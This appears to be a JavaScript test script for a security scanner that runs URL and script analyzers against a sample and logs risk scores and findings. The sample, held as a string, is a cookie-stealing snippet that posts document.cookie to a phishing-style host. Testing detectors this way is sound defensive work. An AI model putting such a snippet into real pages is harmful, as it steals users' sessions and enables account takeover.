const sg = require('./services/scriptGuardian');
const lg = require('./services/linkGuardian');

const maliciousCode = `
    const target = "https://secure-bank-login-update-verify.top/steal";
    const session = document.cookie;
    fetch(target, { method: "POST", body: session });
`;

console.log('--- SENTINEL-AI NEURAL SECURITY AUDIT ---');

// 1. URL Pattern Check
const urlResult = lg.analyze("https://secure-bank-login-update-verify.top/steal");
console.log('\n[LinkGuardian] Target URL Analysis:');
console.log(`- Malicious: ${urlResult.isMalicious}`);
console.log(`- Risk Score: ${urlResult.riskScore}%`);
console.log(`- Reason: ${urlResult.reason}`);

// 2. Script Content Check
const scriptResult = sg.analyze(maliciousCode, 'tracker.js');
console.log('\n[ScriptGuardian] Script Source Analysis:');
console.log(`- Malicious: ${scriptResult.isMalicious}`);
console.log(`- Risk Score: ${scriptResult.riskScore}%`);
console.log(`- Findings:`);
scriptResult.findings.forEach(f => {
    console.log(`  > [${f.severity}] ${f.type}: ${f.evidence}`);
});
